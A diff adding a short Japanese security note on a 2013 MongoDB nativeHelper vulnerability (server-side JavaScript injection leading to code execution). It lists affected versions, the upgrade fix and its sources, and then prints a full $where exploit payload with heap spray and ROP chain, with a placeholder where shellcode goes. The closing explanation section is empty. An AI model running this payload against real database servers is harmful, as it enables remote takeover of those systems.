@@ -1,0 +1,38 @@
+nativeHelper()に伴う脆弱性について
+=================
+
+#はじめに
+
+2013/03/26 にマイナビニュースに掲載された、MongoDBの脆弱性について検証します。
+
+- [MongoDBに脆弱性](http://news.mynavi.jp/news/2013/03/26/158/index.html)
+
+## 影響を受けるバージョン
+
+- MongoDB 2.2以前のバージョン（ただし、ビルド時にJavaScriptエンジンをV8に設定しているものは除く）
+
+## 対策
+
+一番簡単なのはMongoDB 2.4へのバージョンアップです。  
+
+## 情報源
+
+一次情報 mongodb – SSJI to RCE  
+http://blog.scrt.ch/2013/03/24/mongodb-0-day-ssji-to-rce/  
+
+日本語情報 MongoDBに脆弱性  
+http://news.mynavi.jp/news/2013/03/26/158/index.html  
+
+
+## exploiteコード
+
+my_collectionを存在するcollectionへ変更して、下記のコードを実行
+```js
+db.my_collection.find({'$where':'shellcode=unescape("METASPLOIT JS GENERATED SHELLCODE"); sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+=unescape("%u9090%u9090"); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i<25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape("%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000"); sizechunk2=0x1000; chunk2=""; for(i=0;i<sizechunk2;i++){ chunk2+=unescape("%u5a70%u0805"); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i<25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({"x" : 0x836e204}, ["A"+"\x26\x18\x35\x08"+"MongoSploit!"+"\x58\x71\x45\x08"+"sthack is a nice place to be"+"\x6c\x5a\x05\x08"+"\x20\x20\x20\x20"+"\x58\x71\x45\x08"]);'})
+```
+
+## 何が問題？
+
+
+
+
